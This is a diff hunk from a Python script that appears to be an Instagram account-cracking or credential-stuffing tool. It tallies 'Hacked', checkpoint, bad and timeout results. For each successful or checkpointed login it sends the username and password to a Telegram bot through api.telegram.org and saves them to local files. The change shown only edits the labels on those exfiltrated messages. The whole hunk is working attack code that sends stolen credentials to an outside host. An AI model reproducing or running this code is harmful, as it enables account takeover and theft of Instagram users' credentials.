@@ -88,14 +88,14 @@ def instagram():
                 elif 'userId' in login:
                     hits+=1
                     print(f'\r[-] Hacked : {hits} | [-] checkpoint : {checkpoint} | [-] bad : {bad} | [-] timeout : {timeout} | [-] error : {error}',end='')
-                    boooom=f"\nuser&num&emil: "+user+":"+pasw
+                    boooom=f"GOOD: "+user+":"+pasw
                     r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={boooom}\n')
                     with open('Good(instgram).txt', 'a') as ff:
                         ff.write(f"\nuser&num&emil: "+user+":"+pasw)
                 elif ('"message":"checkpoint_required"') in login:
                     checkpoint+=1
                     print(f"\r[-] Hacked : {hits} | [-] checkpoint : {checkpoint} | [-] bad : {bad} | [-] timeout : {timeout} | [-] error : {error}",end="")
-                    booom=f"\nuser&num&emil: "+user+":"+pasw
+                    booom=f"Checkpoint: "+user+":"+pasw
                     r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={booom}\n')
                     with open("checkpoint.txt", "a") as dd:
                         dd.write(f"\nuser&num&emil: "+user+":"+pasw)
